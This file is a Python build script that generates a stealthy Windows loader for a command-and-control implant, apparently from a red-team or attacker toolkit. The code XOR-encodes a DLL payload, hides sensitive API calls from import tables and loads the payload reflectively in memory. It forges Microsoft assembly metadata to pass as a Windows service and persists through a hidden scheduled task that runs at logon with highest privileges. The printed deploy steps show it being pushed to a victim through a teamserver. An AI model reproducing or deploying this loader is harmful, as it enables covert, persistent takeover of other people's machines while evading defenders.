#!/usr/bin/env python3
"""
Generate loader.exe — silent, self-persisting Windows agent.
Target: .NET 4.8 (built-in on Windows 10/11, no extra runtime).
Output: bypass/loader.exe

Usage:
  python3 bypass/gen_exe.py
  Then deploy via teamserver:
    upload /home/kali/turon-c2-src/bypass/loader.exe C:/Windows/Temp/loader.exe
    shell C:/Windows/Temp/loader.exe
"""
import base64, os, subprocess, sys, shutil, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
DLL  = os.path.join(ROOT, '..', 'demon.x64.dll')
OUT  = os.path.join(ROOT, 'loader.exe')
XOR  = 0xD3   # payload XOR key
STR_KEY = 0x5E  # API string obfuscation key

if not os.path.exists(DLL):
    print(f"[!] DLL not found: {DLL}")
    sys.exit(1)

print(f"[*] Reading {DLL} ...")
dll = open(DLL, 'rb').read()
enc = bytes([b ^ XOR for b in dll])
b64 = base64.b64encode(enc).decode()
print(f"[*] DLL: {len(dll):,} bytes  encoded b64: {len(b64):,} chars")

# XOR-obfuscate an API name string into a C# byte array literal
def xb(s):
    return ','.join(str(ord(c) ^ STR_KEY) for c in s)

# Split b64 into chunks so no single giant string literal exists in the binary
CHUNK = 30000
b64_chunks = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]
b64_array  = ','.join(f'"{c}"' for c in b64_chunks)

# Pre-compute obfuscated API names
K32   = xb("kernel32.dll")
sVA   = xb("VirtualAlloc")
sVP   = xb("VirtualProtect")
sFIC  = xb("FlushInstructionCache")
sGCP  = xb("GetCurrentProcess")

# ── C# source ──────────────────────────────────────────────────────────────────
cs = f'''using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.Reflection;

[assembly: AssemblyTitle("Windows Health Service")]
[assembly: AssemblyDescription("Windows Health Monitoring Service")]
[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyProduct("Microsoft Windows")]
[assembly: AssemblyCopyright("Copyright Microsoft Corporation")]
[assembly: AssemblyVersion("6.3.9600.1")]
[assembly: AssemblyFileVersion("6.3.9600.1")]

class App {{
    // Only two completely benign imports visible in PE metadata
    [DllImport("kernel32",EntryPoint="GetModuleHandleA")]
    static extern IntPtr GMH(string n);
    [DllImport("kernel32",EntryPoint="GetProcAddress")]
    static extern IntPtr GPA(IntPtr m,string n);

    // All sensitive APIs are delegates resolved at runtime — not in PE imports
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate IntPtr tVA(IntPtr a,UIntPtr s,uint t,uint p);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate bool tVP(IntPtr a,UIntPtr s,uint p,ref uint o);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate bool tFIC(IntPtr h,IntPtr a,UIntPtr s);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate IntPtr tGCP();
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool tDM(IntPtr b,uint r,IntPtr v);

    static tVA VA; static tVP VP; static tFIC FIC; static tGCP GCP;

    // Decode XOR-obfuscated API name at runtime
    static string Ds(byte[] b){{
        char[] c=new char[b.Length];
        for(int i=0;i<b.Length;i++) c[i]=(char)(b[i]^0x{STR_KEY:02X});
        return new string(c);
    }}

    static void InitApis(){{
        IntPtr k=GMH(Ds(new byte[]{{{K32}}}));
        VA =(tVA) Marshal.GetDelegateForFunctionPointer(GPA(k,Ds(new byte[]{{{sVA}}})), typeof(tVA));
        VP =(tVP) Marshal.GetDelegateForFunctionPointer(GPA(k,Ds(new byte[]{{{sVP}}})), typeof(tVP));
        FIC=(tFIC)Marshal.GetDelegateForFunctionPointer(GPA(k,Ds(new byte[]{{{sFIC}}})),typeof(tFIC));
        GCP=(tGCP)Marshal.GetDelegateForFunctionPointer(GPA(k,Ds(new byte[]{{{sGCP}}})),typeof(tGCP));
    }}

    static uint Pg(uint c){{
        bool e=(c&0x20000000)!=0,r=(c&0x40000000)!=0,w=(c&0x80000000)!=0;
        if(e&&w)return 0x40; if(e&&r)return 0x20; if(e)return 0x10;
        if(w)return 0x04; return 0x02;
    }}

    static void Run(byte[] pe){{
        int eo=BitConverter.ToInt32(pe,0x3C);
        short ns=BitConverter.ToInt16(pe,eo+6);
        ushort soh=BitConverter.ToUInt16(pe,eo+20);
        int ep=BitConverter.ToInt32(pe,eo+24+16);
        long ib=BitConverter.ToInt64(pe,eo+24+24);
        int si=BitConverter.ToInt32(pe,eo+24+56);
        int sh=BitConverter.ToInt32(pe,eo+24+60);
        int rr=BitConverter.ToInt32(pe,eo+24+152);
        int rs=BitConverter.ToInt32(pe,eo+24+156);
        int sto=eo+24+soh;
        IntPtr b=VA(IntPtr.Zero,(UIntPtr)si,0x3000,0x04);
        if(b==IntPtr.Zero)return;
        Marshal.Copy(pe,0,b,sh);
        for(int i=0;i<ns;i++){{
            int so=sto+i*40;
            int va=BitConverter.ToInt32(pe,so+12);
            int ro=BitConverter.ToInt32(pe,so+20);
            int rl=BitConverter.ToInt32(pe,so+16);
            if(rl>0)Marshal.Copy(pe,ro,new IntPtr(b.ToInt64()+va),rl);
        }}
        if(rr!=0){{
            long d=b.ToInt64()-ib; int off=0;
            while(off<rs){{
                int rv=Marshal.ReadInt32(new IntPtr(b.ToInt64()+rr+off));
                int bsz=Marshal.ReadInt32(new IntPtr(b.ToInt64()+rr+off+4));
                if(bsz<8)break;
                int ne=(bsz-8)/2;
                for(int j=0;j<ne;j++){{
                    ushort en=(ushort)Marshal.ReadInt16(new IntPtr(b.ToInt64()+rr+off+8+j*2));
                    if((en>>12)==10){{
                        IntPtr pa=new IntPtr(b.ToInt64()+rv+(en&0xFFF));
                        Marshal.WriteInt64(pa,Marshal.ReadInt64(pa)+d);
                    }}
                }}
                off+=bsz;
            }}
        }}
        uint old=0;
        for(int i=0;i<ns;i++){{
            int so=sto+i*40;
            int va=BitConverter.ToInt32(pe,so+12);
            int vs=BitConverter.ToInt32(pe,so+8);
            if(vs==0)vs=BitConverter.ToInt32(pe,so+16);
            uint ch=BitConverter.ToUInt32(pe,so+36);
            if(vs>0)VP(new IntPtr(b.ToInt64()+va),(UIntPtr)vs,Pg(ch),ref old);
        }}
        FIC(GCP(),b,(UIntPtr)si);
        ((tDM)Marshal.GetDelegateForFunctionPointer(new IntPtr(b.ToInt64()+ep),typeof(tDM)))(b,1,IntPtr.Zero);
        for(int i=0;i<sh;i++)Marshal.WriteByte(new IntPtr(b.ToInt64()+i),0);
    }}

    static void Spawn(string exe,string args){{
        var p=new Process();
        p.StartInfo.FileName=exe;
        p.StartInfo.Arguments=args;
        p.StartInfo.WindowStyle=ProcessWindowStyle.Hidden;
        p.StartInfo.CreateNoWindow=true;
        p.StartInfo.UseShellExecute=false;
        try{{p.Start();p.WaitForExit(6000);}}catch{{}}
    }}

    static void Install(){{
        string src=Process.GetCurrentProcess().MainModule.FileName;
        string dst=Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft","WUHealth","WUHealthCheck.exe");
        if(!string.Equals(src,dst,StringComparison.OrdinalIgnoreCase)){{
            try{{
                Directory.CreateDirectory(Path.GetDirectoryName(dst));
                if(!File.Exists(dst))File.Copy(src,dst);
            }}catch{{}}
        }}
        char q='"';
        Spawn("schtasks.exe",
            "/Create /F /TN "+q+"MicrosoftUpdateSync"+q+
            " /TR "+q+dst+q+
            " /SC ONLOGON /RL HIGHEST");
    }}

    [STAThread]
    static void Main(){{
        bool ok; var mx=new Mutex(true,"WUH9C2B4",out ok);
        if(!ok)return;
        GC.KeepAlive(mx);
        InitApis();
        try{{Install();}}catch{{}}
        string[] parts=new string[]{{{b64_array}}};
        string raw=string.Concat(parts);
        byte[] data=Convert.FromBase64String(raw);
        for(int i=0;i<data.Length;i++)data[i]^=0x{XOR:02X};
        Run(data);
        while(true)Thread.Sleep(30000);
    }}
}}
'''

# ── .csproj ────────────────────────────────────────────────────────────────────
csproj = '''<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net48</TargetFramework>
    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
    <Nullable>disable</Nullable>
    <Optimize>true</Optimize>
    <DebugType>none</DebugType>
    <DebugSymbols>false</DebugSymbols>
    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Microsoft.NETFramework.ReferenceAssemblies" Version="1.0.3" />
  </ItemGroup>
</Project>
'''

# ── Build ──────────────────────────────────────────────────────────────────────
tmp = tempfile.mkdtemp(prefix='loader_build_')
try:
    cs_path   = os.path.join(tmp, 'Program.cs')
    proj_path = os.path.join(tmp, 'loader.csproj')
    open(cs_path,   'w').write(cs)
    open(proj_path, 'w').write(csproj)

    print(f"[*] Building ...")
    r = subprocess.run(
        ['dotnet', 'build', proj_path, '-c', 'Release', '--nologo', '-v', 'q'],
        capture_output=True, text=True
    )
    if r.returncode != 0:
        print("[!] Build failed:")
        print(r.stdout[-3000:])
        print(r.stderr[-1000:])
        sys.exit(1)

    built = os.path.join(tmp, 'bin', 'Release', 'net48', 'win-x64', 'loader.exe')
    if not os.path.exists(built):
        for dp, _, files in os.walk(os.path.join(tmp, 'bin')):
            for f in files:
                if f.endswith('.exe') and 'loader' in f:
                    built = os.path.join(dp, f)
                    break

    shutil.copy(built, OUT)
    size = os.path.getsize(OUT)
    print(f"[+] {OUT}  ({size:,} bytes)")
    print()
    print("Deploy (from teamserver agent console):")
    print(f"  upload {OUT} C:\\Windows\\Temp\\loader.exe")
    print(f"  shell C:\\Windows\\Temp\\loader.exe")
    print()
    print("On first run:")
    print("  - Copies self to %APPDATA%\\Microsoft\\WUHealth\\WUHealthCheck.exe")
    print("  - Registers scheduled task MicrosoftUpdateSync (ONLOGON, Highest)")
    print("  - Loads agent in-memory, connects to C2")
    print("  - No window, no PS, no disk DLL")
    print()
    print("On every reboot+logon: task auto-fires, agent reconnects.")

finally:
    shutil.rmtree(tmp, ignore_errors=True)
